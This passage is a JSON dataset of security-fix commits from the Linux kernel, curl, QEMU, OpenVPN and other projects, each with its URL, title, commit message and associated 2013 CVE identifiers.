  "6ce6d658c41ea08ced039a77321683f2ff153261c4326419f4a00c890e7570b8": {
    "url": "https://github.com/torvalds/linux/commit/715230a44310a8cf66fbfb5a46f9a62a9b2de424",
    "title": "tg3: fix length overflow in VPD firmware parsing",
    "body": "Commit 184b890 (\"tg3: Use VPD fw versionwhen present\") introduced VPD parsing that contained a potential lengthoverflow.Limit the hardware's reported firmware string length (max 255 bytes) tostay inside the driver's firmware string length (32 bytes). On overflow,truncate the formatted firmware string instead of potentially overwritingportions of the tg3 struct.http://cansecwest.com/slides/2013/PrivateCore%20CSW%202013.pdfSigned-off-by: Kees Cook <keescook@chromium.org>Reported-by: Oded Horovitz <oded@privatecore.com>Reported-by: Brad Spengler <spender@grsecurity.net>Cc: stable@vger.kernel.orgCc: Matt Carlson <mcarlson@broadcom.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-1929"
    ],
    "cveIdsCount": 1
  },
  "2a883f520c0b83fb0a165d22102c33782bcb1ee8af5948396f6c8a63c3b82cf9": {
    "url": "https://github.com/torvalds/linux/commit/fa3d315a4ce2c0891cdde262562e710d95fba19e",
    "title": "KVM: Validate userspace_addr of memslot when registered",
    "body": "This way, we can avoid checking the user space address many times whenwe read the guest memory.Although we can do the same for write if we check which slots arewritable, we do not care write now: reading the guest memory happensmore often than writing.[avi: change VERIFY_READ to VERIFY_WRITE]Signed-off-by: Takuya Yoshikawa <yoshikawa.takuya@oss.ntt.co.jp>Signed-off-by: Avi Kivity <avi@redhat.com>",
    "cveIds": [
      "CVE-2013-1943"
    ],
    "cveIdsCount": 1
  },
  "66ccb9b07006a99285704998347de9e6e285be879027b069e40ec507b9295a22": {
    "url": "https://github.com/bagder/curl/commit/2eb8dcf26cb37f09cffe26909a646e702dbcab66",
    "title": "cookie: fix tailmatching to prevent cross-domain leakage",
    "body": "Cookies set for 'example.com' could accidentaly also be sent by libcurlto the 'bexample.com' (ie with a prefix to the first domain name).This is a security vulnerabilty, CVE-2013-1944.Bug: http://curl.haxx.se/docs/adv_20130412.html",
    "cveIds": [
      "CVE-2013-1944"
    ],
    "cveIdsCount": 1
  },
  "e7d5d35d60195b9d24c14d75a2e74847cf311b73e3419e800f2db15bb7082cda": {
    "url": "https://github.com/torvalds/linux/commit/3151527ee007b73a0ebd296010f1c0454a919c7d",
    "title": "userns: Don't allow creation if the user is chrooted",
    "body": "Guarantee that the policy of which files may be access that isestablished by setting the root directory will not be violatedby user namespaces by verifying that the root directory pointsto the root of the mount namespace at the time of user namespacecreation.Changing the root is a privileged operation, and as a matter of policyit serves to limit unprivileged processes to files below the currentroot directory.For reasons of simplicity and comprehensibility the privilege tochange the root directory is gated solely on the CAP_SYS_CHROOTcapability in the user namespace. Therefore when creating a usernamespace we must ensure that the policy of which files may be accesscan not be violated by changing the root directory.Anyone who runs a processes in a chroot and would like to use usernamespace can setup the same view of filesystems with a mountnamespace instead. With this result that this is not a practicallimitation for using user namespaces.Cc: stable@vger.kernel.orgAcked-by: Serge Hallyn <serge.hallyn@canonical.com>Reported-by: Andy Lutomirski <luto@amacapital.net>Signed-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>",
    "cveIds": [
      "CVE-2013-1956"
    ],
    "cveIdsCount": 1
  },
  "f4d57b5332eb0700442e8ffad9f89c97a6b452215a01c79d76339ad648466f12": {
    "url": "https://github.com/torvalds/linux/commit/132c94e31b8bca8ea921f9f96a57d684fa4ae0a9",
    "title": "vfs: Carefully propogate mounts across user namespaces",
    "body": "As a matter of policy MNT_READONLY should not be changable if theoriginal mounter had more privileges than creator of the mountnamespace.Add the flag CL_UNPRIVILEGED to note when we are copying a mount froma mount namespace that requires more privileges to a mount namespacethat requires fewer privileges.When the CL_UNPRIVILEGED flag is set cause clone_mnt to set MNT_NO_REMOUNTif any of the mnt flags that should never be changed are set.This protects both mount propagation and the initial creation of a lessprivileged mount namespace.Cc: stable@vger.kernel.orgAcked-by: Serge Hallyn <serge.hallyn@canonical.com>Reported-by: Andy Lutomirski <luto@amacapital.net>Signed-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>",
    "cveIds": [
      "CVE-2013-1957"
    ],
    "cveIdsCount": 1
  },
  "431c0fb2b2dbadb29a31df1b04fb033432db7180b81d113263b85216360707ab": {
    "url": "https://github.com/torvalds/linux/commit/92f28d973cce45ef5823209aab3138eb45d8b349",
    "title": "scm: Require CAP_SYS_ADMIN over the current pidns to spoof pids.",
    "body": "Don't allow spoofing pids over unix domain sockets in the cornercases where a user has created a user namespace but has not yetcreated a pid namespace.Cc: stable@vger.kernel.orgReported-by: Andy Lutomirski <luto@amacapital.net>Signed-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>",
    "cveIds": [
      "CVE-2013-1958"
    ],
    "cveIdsCount": 1
  },
  "193eb716dfd827282cae1dc2ab2b81b91d9a7618eef2f7133e59a6d19bbbca7d": {
    "url": "https://github.com/torvalds/linux/commit/6708075f104c3c9b04b23336bb0366ca30c3931b",
    "title": "userns: Don't let unprivileged users trick privileged users into sett…",
    "body": "…ing the id_mapWhen we require privilege for setting /proc/<pid>/uid_map or/proc/<pid>/gid_map no longer allow an unprivileged user toopen the file and pass it to a privileged program to writeto the file.Instead when privilege is required require both the opener and thewriter to have the necessary capabilities.I have tested this code and verified that setting /proc/<pid>/uid_mapfails when an unprivileged user opens the file and a privielged userattempts to set the mapping, that unprivileged users can still maptheir own id, and that a privileged users can still setup an arbitrarymapping.Reported-by: Andy Lutomirski <luto@amacapital.net>Signed-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>Signed-off-by: Andy Lutomirski <luto@amacapital.net>",
    "cveIds": [
      "CVE-2013-1959"
    ],
    "cveIdsCount": 1
  },
  "93b6c519c1457d797acd89720856184fdb54bdaac307443b9d5e2d702e14eba9": {
    "url": "https://github.com/torvalds/linux/commit/e3211c120a85b792978bcb4be7b2886df18d27f0",
    "title": "userns: Check uid_map's opener's fsuid, not the current fsuid",
    "body": "Signed-off-by: Andy Lutomirski <luto@amacapital.net>",
    "cveIds": [
      "CVE-2013-1959"
    ],
    "cveIdsCount": 1
  },
  "f69d70c18c6dfe5e3391d3568cc94b0174fbd96b88e2ff3e0b4f62f064b8fd28": {
    "url": "https://github.com/torvalds/linux/commit/83f1b4ba917db5dc5a061a44b3403ddb6e783494",
    "title": "net: fix incorrect credentials passing",
    "body": "Commit 257b535 (\"scm: Capture the full credentials of the scmsender\") changed the credentials passing code to pass in the effectiveuid/gid instead of the real uid/gid.Obviously this doesn't matter most of the time (since normally they arethe same), but it results in differences for suid binaries when the wronguid/gid ends up being used.This just undoes that (presumably unintentional) part of the commit.Reported-by: Andy Lutomirski <luto@amacapital.net>Cc: Eric W. Biederman <ebiederm@xmission.com>Cc: Serge E. Hallyn <serge@hallyn.com>Cc: David S. Miller <davem@davemloft.net>Cc: stable@vger.kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>Acked-by: \"Eric W. Biederman\" <ebiederm@xmission.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-1979"
    ],
    "cveIdsCount": 1
  },
  "c16d7252895b4424076e4061cab065285831d39f7a222ce1bd5fcd24b4fc40af": {
    "url": "https://github.com/openstack/keystone/commit/c5037dd6b82909efaaa8720e8cfa8bdb8b4a0edd",
    "title": "Mark LDAP password and admin_token secret",
    "body": "Add secret=True to LDAP password and admin_tokenof keystone configuration.Fix bug #1172195Change-Id: I8ef7f705e3f6b374ff427c20eb761892d5146a75(cherry picked from commit d43e2a5)",
    "cveIds": [
      "CVE-2013-2006"
    ],
    "cveIdsCount": 1
  },
  "7fe440a7b0ce9c894f07baa3c3f4a80b28628953e3e1d5d7de8bf03890fcbf02": {
    "url": "https://github.com/wting/autojump/commit/ad09ee27d402be797b3456abff6edeb4291edfec",
    "title": "Fix security bug that allows running arbitrary user code.",
    "body": "https://bugzilla.redhat.com/show_bug.cgi?id=950777",
    "cveIds": [
      "CVE-2013-2012"
    ],
    "cveIdsCount": 1
  },
  "d31a30f0625d89665026ae036521c2b7c97ea871d75be54ad20a2d595fad29cf": {
    "url": "https://github.com/torvalds/linux/commit/0e9a9a1ad619e7e987815d20262d36a2f95717ca",
    "title": "ext4: avoid hang when mounting non-journal filesystems with orphan list",
    "body": "When trying to mount a file system which does not contain a journal,but which does have a orphan list containing an inode which needs tobe truncated, the mount call with hang forever inext4_orphan_cleanup() because ext4_orphan_del() will returnimmediately without removing the inode from the orphan list, leadingto an uninterruptible loop in kernel code which will busy out one ofthe CPU's on the system.This can be trivially reproduced by trying to mount the file systemfound in tests/f_orphan_extents_inode/image.gz from the e2fsprogssource tree. If a malicious user were to put this on a USB stick, andmount it on a Linux desktop which has automatic mounts enabled, thiscould be considered a potential denial of service attack. (Not a bigdeal in practice, but professional paranoids worry about such things,and have even been known to allocate CVE numbers for such problems.)Signed-off-by: \"Theodore Ts'o\" <tytso@mit.edu>Reviewed-by: Zheng Liu <wenqing.lz@taobao.com>Cc: stable@vger.kernel.org",
    "cveIds": [
      "CVE-2013-2015"
    ],
    "cveIdsCount": 1
  },
  "a1d33137145ada6ecd867ae974870ed647cbcd51f127887e41d762b622624bf7": {
    "url": "https://github.com/qemu/qemu/commit/5f5a1318653c08e435cfa52f60b6a712815b659d",
    "title": "virtio: properly validate address before accessing config",
    "body": "There are several several issues in the current checking:- The check was based on the minus of unsigned values which can overflow- It was done after .{set|get}_config() which can lead crash when config_len is zero since vdev->config is NULLFix this by:- Validate the address in virtio_pci_config_{read|write}() before .{set|get}_config- Use addition instead minus to do the validationCc: Michael S. Tsirkin <mst@redhat.com>Cc: Petr Matousek <pmatouse@redhat.com>Signed-off-by: Jason Wang <jasowang@redhat.com>Acked-by: Michael S. Tsirkin <mst@redhat.com>Acked-by: Petr Matousek <pmatouse@redhat.com>Message-id: 1367905369-10765-1-git-send-email-jasowang@redhat.comSigned-off-by: Anthony Liguori <aliguori@us.ibm.com>",
    "cveIds": [
      "CVE-2013-2016"
    ],
    "cveIdsCount": 1
  },
  "9be82f77e312df22b4325cff138fad07e795fbce57b023abe2517ed1c8b08e81": {
    "url": "https://github.com/torvalds/linux/commit/6ec82562ffc6f297d0de36d65776cff8e5704867",
    "title": "veth: Dont kfree_skb() after dev_forward_skb()",
    "body": "In case of congestion, netif_rx() frees the skb, so we must assumedev_forward_skb() also consume skb.Bug introduced by commit 4454096(veth: move loopback logic to common location)We must change dev_forward_skb() to always consume skb, and veth to notdouble free it.Bug report : http://marc.info/?l=linux-netdev&m=127310770900442&w=3Reported-by: Martín Ferrari <martin.ferrari@gmail.com>Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-2017"
    ],
    "cveIdsCount": 1
  },
  "86606d68c8f7c8ed98f967aac6258e9af8258f039ed098f6afc4edf55c87e990": {
    "url": "https://github.com/rjmackay/Ushahidi_Web/commit/593719ff805a302e3ab2f2e535c875f90a04ea56",
    "title": "Better XSS protection",
    "body": "* Add HTMLPurifier library (LGPL)* Add helper functions to html helper* Set default encoding header to UTF-8* Make sure the doctype is the same everywhere (admin/members/frontend)* Remove use of strip_tags() and htmlspecialchars()* Replace vanilla htmlentities with html::escape() - make sure no one forgets the UTF-8* Remove _csv_text() fn - no longer used and was using strip_tags()",
    "cveIds": [
      "CVE-2013-2025"
    ],
    "cveIdsCount": 1
  },
  "4fb3a3286867e85bcbd4ed3d519f333525cb583c2b43886fbb16d26afec71940": {
    "url": "https://github.com/torvalds/linux/commit/929473ea05db455ad88cdc081f2adc556b8dc48f",
    "title": "usb: chipidea: Allow disabling streaming not only in udc mode",
    "body": "When running a scp transfer using a USB/Ethernet adapter the following crashhappens:$ scp test.tar.gz fabio@192.168.1.100:/home/fabiofabio@192.168.1.100's password:test.tar.gz 0% 0 0.0KB/s --:-- ETA------------[ cut here ]------------WARNING: at net/sched/sch_generic.c:255 dev_watchdog+0x2cc/0x2f0()NETDEV WATCHDOG: eth0 (asix): transmit queue 0 timed outModules linked in:Backtrace:[<80011c94>] (dump_backtrace+0x0/0x10c) from [<804d3a5c>] (dump_stack+0x18/0x1c) r6:000000ff r5:80412388 r4:80685dc0 r3:80696cc0[<804d3a44>] (dump_stack+0x0/0x1c) from [<80021868>](warn_slowpath_common+0x54/0x6c)[<80021814>] (warn_slowpath_common+0x0/0x6c) from [<80021924>](warn_slowpath_fmt+0x38/0x40)...Setting SDIS (Stream Disable Mode- bit 4 of USBMODE register) fixes the problem.However, in current code CI13XXX_DISABLE_STREAMING flag is only set in udc mode,so allow disabling streaming also in host mode.Tested on a mx6qsabrelite board.Suggested-by: Peter Chen <peter.chen@freescale.com>Signed-off-by: Fabio Estevam <fabio.estevam@freescale.com>Reviewed-by: Peter Chen <peter.chen@freescale.com>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2013-2058"
    ],
    "cveIdsCount": 1
  },
  "2154879ce973164a6c7b6ad539ed24c6f8e27f67c8abe71c8029700244049153": {
    "url": "https://github.com/OpenVPN/openvpn/commit/11d21349a4e7e38a025849479b36ace7c2eec2ee",
    "title": "Use constant time memcmp when comparing HMACs in openvpn_decrypt.",
    "body": "Signed-off-by: Steffan Karger <steffan.karger@fox-it.com>Acked-by: Gert Doering <gert@greenie.muc.de>Signed-off-by: Gert Doering <gert@greenie.muc.de>",
    "cveIds": [
      "CVE-2013-2061"
    ],
    "cveIdsCount": 1
  },
  "8fea77448f9f175cb6bdfe47e51c9e4ad31a65e9d31659ae272e975285662786": {
    "url": "https://github.com/Dolibarr/dolibarr/commit/526a80dd202bbca396687a502d52c27e06e97fff",
    "title": "Sec: Param not escaped",
    "body": "Fix: Bad return error",
    "cveIds": [
      "CVE-2013-2093"
    ],
    "cveIdsCount": 1
  },
  "6db6f328f497e0c359936f5510fc5059116e7507edf426dcf7c14f930d25b766": {
    "url": "https://github.com/torvalds/linux/commit/8176cced706b5e5d15887584150764894e94e02f",
    "title": "perf: Treat attr.config as u64 in perf_swevent_init()",
    "body": "Trinity discovered that we fail to check all 64 bits ofattr.config passed by user space, resulting to out-of-boundsaccess of the perf_swevent_enabled array insw_perf_event_destroy().Introduced in commit b0a873e (\"perf: Register PMUimplementations\").Signed-off-by: Tommi Rantala <tt.rantala@gmail.com>Cc: Peter Zijlstra <a.p.zijlstra@chello.nl>Cc: davej@redhat.comCc: Paul Mackerras <paulus@samba.org>Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net>Link: http://lkml.kernel.org/r/1365882554-30259-1-git-send-email-tt.rantala@gmail.comSigned-off-by: Ingo Molnar <mingo@kernel.org>",
    "cveIds": [
      "CVE-2013-2094"
    ],
    "cveIdsCount": 1
  },
  "5fb2a86f33ec6c4e4d112ddb1809056f8941ac9590434b0ce61f822845b5aa97": {
    "url": "https://github.com/gallery/gallery3/commit/80bb0f2222dd99ed2ce59e804b833bab63cc376a",
    "title": "Strip URL fragments off of direct requests to uploadify SWF files.",
    "body": "Fixes #2068.",
    "cveIds": [
      "CVE-2013-2138"
    ],
    "cveIdsCount": 1
  },
  "56226ac2c60ebfe0f443e8f4cff2d8ce727ae80bb998a575ca102f326b9b2cd4": {
    "url": "https://github.com/gallery/gallery3/commit/3e5bba2cd4febe8331c0158c11ea418f21c72efa",
    "title": "Wrap all Flowplayer SWF files with a preamble that strips query param…",
    "body": "…eters.Fixes #2070.",
    "cveIds": [
      "CVE-2013-2138"
    ],
    "cveIdsCount": 1
  },
  "fe3ba55fe4200a01623dbd053bae77061a1a558c9397187ef7cff6e70104ce9e": {
    "url": "https://github.com/torvalds/linux/commit/604c499cbbcc3d5fe5fb8d53306aa0fae1990109",
    "title": "xen/blkback: Check device permissions before allowing OP_DISCARD",
    "body": "We need to make sure that the device is not RO or thatthe request is not past the number of sectors we want toissue the DISCARD operation for.This fixes CVE-2013-2140.Cc: stable@vger.kernel.orgAcked-by: Jan Beulich <JBeulich@suse.com>Acked-by: Ian Campbell <Ian.Campbell@citrix.com>[v1: Made it pr_warn instead of pr_debug]Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>",
    "cveIds": [
      "CVE-2013-2140"
    ],
    "cveIdsCount": 1
  },
  "b6a64b65120666d73a7662f2043beb852c2492d33d77779d99ff101b51394410": {
    "url": "https://github.com/torvalds/linux/commit/b9e146d8eb3b9ecae5086d373b50fa0c1f3e7f0f",
    "title": "kernel/signal.c: stop info leak via the tkill and the tgkill syscalls",
    "body": "This fixes a kernel memory contents leak via the tkill and tgkill syscallsfor compat processes.This is visible in the siginfo_t->_sifields._rt.si_sigval.sival_ptr fieldwhen handling signals delivered from tkill.The place of the infoleak:int copy_siginfo_to_user32(compat_siginfo_t __user *to, siginfo_t *from){ ... put_user_ex(ptr_to_compat(from->si_ptr), &to->si_ptr); ...}Signed-off-by: Emese Revfy <re.emese@gmail.com>Reviewed-by: PaX Team <pageexec@freemail.hu>Signed-off-by: Kees Cook <keescook@chromium.org>Cc: Al Viro <viro@zeniv.linux.org.uk>Cc: Oleg Nesterov <oleg@redhat.com>Cc: \"Eric W. Biederman\" <ebiederm@xmission.com>Cc: Serge Hallyn <serge.hallyn@canonical.com>Cc: <stable@vger.kernel.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2013-2141"
    ],
    "cveIdsCount": 1
  },
  "3ffc2d78b22d89e1f369a2a21c4f9f19c3453e97e35266627a9d506a199076d9": {
    "url": "https://github.com/torvalds/linux/commit/f1923820c447e986a9da0fc6bf60c1dccdf0408e",
    "title": "perf/x86: Fix offcore_rsp valid mask for SNB/IVB",
    "body": "The valid mask for both offcore_response_0 andoffcore_response_1 was wrong for SNB/SNB-EP,IVB/IVB-EP. It was possible to write toreserved bit and cause a GP fault crashingthe kernel.This patch fixes the problem by correctly marking thereserved bits in the valid mask for all the processorsmentioned above.A distinction between desktop and server parts is introducedbecause bits 24-30 are only available on the server parts.This version of the patch is just a rebase to perf/urgent treeand should apply to older kernels as well.Signed-off-by: Stephane Eranian <eranian@google.com>Cc: peterz@infradead.orgCc: jolsa@redhat.comCc: gregkh@linuxfoundation.orgCc: security@kernel.orgCc: ak@linux.intel.comSigned-off-by: Ingo Molnar <mingo@kernel.org>",
    "cveIds": [
      "CVE-2013-2146"
    ],
    "cveIdsCount": 1
  },
  "77ff33edcd18259e26ecf5a8af0b3848db95bbc1ce6e3d2b29ee0e924da3eb79": {
    "url": "https://github.com/bagder/curl/commit/192c4f788d48f82c03e9cef40013f34370e90737",
    "title": "Curl_urldecode: no peeking beyond end of input buffer",
    "body": "Security problem: CVE-2013-2174If a program would give a string like \"%FF\" to curl_easy_unescape() butask for it to decode only the first byte, it would still parse anddecode the full hex sequence. The function then not only read beyond theallowed buffer but it would also deduct the *unsigned* counter variablefor how many more bytes there's left to read in the buffer by two,making the counter wrap. Continuing this, the function would go onreading beyond the buffer and soon writing beyond the allocated targetbuffer...Bug: http://curl.haxx.se/docs/adv_20130622.htmlReported-by: Timo Sirainen",
    "cveIds": [
      "CVE-2013-2174"
    ],
    "cveIdsCount": 1
  },
  "c7f1fd4557d5d965665f39a098413eee4439587e574144f60fff44c514da9264": {
    "url": "https://github.com/monkey/monkey/commit/15f72c1ee5e0afad20232bdf0fcecab8d62a5d89",
    "title": "Mandril: check decoded URI (fix #92)",
    "body": "Signed-off-by: Eduardo Silva <eduardo@monkey.io>",
    "cveIds": [
      "CVE-2013-2182"
    ],
    "cveIdsCount": 1
  },
  "44210eb33d7276ba1a60b6769914ebc4bc73ac6c0e0433b4b35e363e779708b6": {
    "url": "https://github.com/reviewboard/reviewboard/commit/4aaacbb1e628a80803ba1a55703db38fccdf7dbf",
    "title": "Fix an XSS vulnerability in the reviews dropdown.",
    "body": "The reviews dropdown had a bad vulnerability where it would assume theuser's full name is valid HTML. This allowed the user to craft a scripttag that would be executed every time the name appeared in the dropdown.This vulnerability exists in 1.6.x, 1.7.x, and the in-development 1.8.There are no known attacks in the wild.This was reported by Craig Young at Tripwire.",
    "cveIds": [
      "CVE-2013-2209"
    ],
    "cveIdsCount": 1
  },
  "75c93ae1e906b91fe75ed7ec8ba4be9b49aa76c1cce20e8714b81ddacb1dabc8": {
    "url": "https://github.com/gallery/gallery3/commit/cbbcf1b4791762d7da0ea7b6c4f4b551a4d9caed",
    "title": "#2074 - Mirror some additional file_proxy checks in data_rest.",
    "body": "--HG--extra : source : 752417004a5c988b09f1312c4e96f10dd11594b9",
    "cveIds": [
      "CVE-2013-2241"
    ],
    "cveIdsCount": 1
  },
  "ad57ff9308e9f79bf8ee600b10dc777468e9c9832343093b2aebe874e35a726b": {
    "url": "https://github.com/torvalds/linux/commit/9a5467bf7b6e9e02ec9c3da4e23747c05faeaac6",
    "title": "crypto: user - fix info leaks in report API",
    "body": "Three errors resulting in kernel memory disclosure:1/ The structures used for the netlink based crypto algorithm report APIare located on the stack. As snprintf() does not fill the remainder ofthe buffer with null bytes, those stack bytes will be disclosed to usersof the API. Switch to strncpy() to fix this.2/ crypto_report_one() does not initialize all field of structcrypto_user_alg. Fix this to fix the heap info leak.3/ For the module name we should copy only as many bytes asmodule_name() returns -- not as much as the destination buffer couldhold. But the current code does not and therefore copies random datafrom behind the end of the module name, as the module name is alwaysshorter than CRYPTO_MAX_ALG_NAME.Also switch to use strncpy() to copy the algorithm's name anddriver_name. They are strings, after all.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: Steffen Klassert <steffen.klassert@secunet.com>Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>",
    "cveIds": [
      "CVE-2013-2546",
      "CVE-2013-2547",
      "CVE-2013-2548"
    ],
    "cveIdsCount": 3
  },
  "67c8585875c095a516f8df4ecdc590ede2b01d42b2b8db0937dc2cb72a811f0d": {
    "url": "https://github.com/torvalds/linux/commit/b4cbb197c7e7a68dbad0d491242e3ca67420c13e",
    "title": "vm: add vm_iomap_memory() helper function",
    "body": "Various drivers end up replicating the code to mmap() their memorybuffers into user space, and our core memory remapping function may bevery flexible but it is unnecessarily complicated for the common casesto use.Our internal VM uses pfn's (\"page frame numbers\") which simplifiesthings for the VM, and allows us to pass physical addresses around in adenser and more efficient format than passing a \"phys_addr_t\" around,and having to shift it up and down by the page size. But it just meansthat drivers end up doing that shifting instead at the interface level.It also means that drivers end up mucking around with internal VM thingslike the vma details (vm_pgoff, vm_start/end) way more than they reallyneed to.So this just exports a function to map a certain physical memory rangeinto user space (using a phys_addr_t based interface that is much morenatural for a driver) and hides all the complexity from the driver.Some drivers will still end up tweaking the vm_page_prot details forthings like prefetching or cacheability etc, but that's actuallyrelevant to the driver, rather than caring about what the page offset ofthe mapping is into the particular IO memory region.Acked-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2013-2596"
    ],
    "cveIdsCount": 1
  },
  "7d803f9551f9a04665a2a7829feb0fbca147d86bd726d07c31669f7c2df8eccd": {
    "url": "https://github.com/torvalds/linux/commit/fc9bbca8f650e5f738af8806317c0a041a48ae4a",
    "title": "vm: convert fb_mmap to vm_iomap_memory() helper",
    "body": "This is my example conversion of a few existing mmap users. Thefb_mmap() case is a good example because it is a bit more complicatedthan some: fb_mmap() mmaps one of two different memory areas dependingon the page offset of the mmap (but happily there is never any mixing ofthe two, so the helper function still works).Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2013-2596"
    ],
    "cveIdsCount": 1
  },
  "04d00eaa0d2da899e4febffe4f720e89414b1b4fbe7bfab6b941b3ee1d72b08a": {
    "url": "https://github.com/torvalds/linux/commit/29cd8ae0e1a39e239a3a7b67da1986add1199fc0",
    "title": "dcbnl: fix various netlink info leaks",
    "body": "The dcb netlink interface leaks stack memory in various places:* perm_addr[] buffer is only filled at max with 12 of the 32 bytes but copied completely,* no in-kernel driver fills all fields of an IEEE 802.1Qaz subcommand, so we're leaking up to 58 bytes for ieee_ets structs, up to 136 bytes for ieee_pfc structs, etc.,* the same is true for CEE -- no in-kernel driver fills the whole struct,Prevent all of the above stack info leaks by properly initializing thebuffers/structures involved.Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-2634"
    ],
    "cveIdsCount": 1
  },
  "b79793e3f668f5874713b36de944b4eb7958ba598201379b94cc825a434aa96c": {
    "url": "https://github.com/torvalds/linux/commit/84d73cd3fb142bf1298a8c13fd4ca50fd2432372",
    "title": "rtnl: fix info leak on RTM_GETLINK request for VF devices",
    "body": "Initialize the mac address buffer with 0 as the driver specific functionwill probably not fill the whole buffer. In fact, all in-kernel driversfill only ETH_ALEN of the MAX_ADDR_LEN bytes, i.e. 6 of the 32 possiblebytes. Therefore we currently leak 26 bytes of stack memory to userlandvia the netlink interface.Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-2635"
    ],
    "cveIdsCount": 1
  },
  "f2bb03f2b2a8245eab7b91af409f146e25dc1a7e5676e56fd7e874ee7c6be182": {
    "url": "https://github.com/torvalds/linux/commit/c085c49920b2f900ba716b4ca1c1a55ece9872cc",
    "title": "bridge: fix mdb info leaks",
    "body": "The bridging code discloses heap and stack bytes via the RTM_GETMDBnetlink interface and via the notify messages send to group RTNLGRP_MDBafer a successful add/del.Fix both cases by initializing all unset members/padding bytes withmemset(0).Cc: Stephen Hemminger <stephen@networkplumber.org>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-2636"
    ],
    "cveIdsCount": 1
  },
  "f1158203027a79e55f3bf8cfc2e0a167a906145ff83392217a01951007e1b9be": {
    "url": "https://github.com/chillu/silverstripe-framework/commit/3e88c98ca513880e2b43ed7f27ade17fef5d9170",
    "title": "API Restrict MemberLoginForm to POST requests for increased security",
    "body": "CVE-2013-2653 - Thanks to Fara Rustein of Deloitte Argentina for reporting.",
    "cveIds": [
      "CVE-2013-2653",
      "CVE-2013-6789"
    ],
    "cveIdsCount": 2
  },
  "1c1caf169604128b3b73ad29197c909662e2a902a47134539e97e0f1601cb359": {
    "url": "https://github.com/SpiderLabs/ModSecurity/commit/0840b13612a0b7ef1ce7441cf811dcfc6b463fba",
    "title": "Fixed: chuck null pointer when unknown CT is sent and over in-memory …",
    "body": "…limit",
    "cveIds": [
      "CVE-2013-2765"
    ],
    "cveIdsCount": 1
  },
  "cbc8648da250e30daa24ee6e8e7cd99d112e190cd5d0a931fed40334cdb2bfd1": {
    "url": "https://github.com/torvalds/linux/commit/cea4dcfdad926a27a18e188720efe0f2c9403456",
    "title": "iscsi-target: fix heap buffer overflow on error",
    "body": "If a key was larger than 64 bytes, as checked by iscsi_check_key(), theerror response packet, generated by iscsi_add_notunderstood_response(),would still attempt to copy the entire key into the packet, overflowingthe structure on the heap.Remote preauthentication kernel memory corruption was possible if atarget was configured and listening on the network.CVE-2013-2850Signed-off-by: Kees Cook <keescook@chromium.org>Cc: stable@vger.kernel.orgSigned-off-by: Nicholas Bellinger <nab@linux-iscsi.org>",
    "cveIds": [
      "CVE-2013-2850"
    ],
    "cveIdsCount": 1
  },
  "055c4d5c278a6cbf47c84d2ecfc0c11b37ecaa72ae52a0a164fdd5a7aac6abd1": {
    "url": "https://github.com/torvalds/linux/commit/d049f74f2dbe71354d43d393ac3a188947811348",
    "title": "exec/ptrace: fix get_dumpable() incorrect tests",
    "body": "The get_dumpable() return value is not boolean. Most users of thefunction actually want to be testing for non-SUID_DUMP_USER(1) rather thanSUID_DUMP_DISABLE(0). The SUID_DUMP_ROOT(2) is also considered aprotected state. Almost all places did this correctly, excepting the twoplaces fixed in this patch.Wrong logic: if (dumpable == SUID_DUMP_DISABLE) { /* be protective */ } or if (dumpable == 0) { /* be protective */ } or if (!dumpable) { /* be protective */ }Correct logic: if (dumpable != SUID_DUMP_USER) { /* be protective */ } or if (dumpable != 1) { /* be protective */ }Without this patch, if the system had set the sysctl fs/suid_dumpable=2, auser was able to ptrace attach to processes that had dropped privileges tothat user. (This may have been partially mitigated if Yama was enabled.)The macros have been moved into the file that declares get/set_dumpable(),which means things like the ia64 code can see them too.CVE-2013-2929Reported-by: Vasily Kulikov <segoon@openwall.com>Signed-off-by: Kees Cook <keescook@chromium.org>Cc: \"Luck, Tony\" <tony.luck@intel.com>Cc: Oleg Nesterov <oleg@redhat.com>Cc: \"Eric W. Biederman\" <ebiederm@xmission.com>Cc: <stable@vger.kernel.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2013-2929"
    ],
    "cveIdsCount": 1
  },
  "331ff2fcb72aad68acb86fdfec229618fe665714a388698bab0acf348ba6db0d": {
    "url": "https://github.com/torvalds/linux/commit/12ae030d54ef250706da5642fc7697cc60ad0df7",
    "title": "perf/ftrace: Fix paranoid level for enabling function tracer",
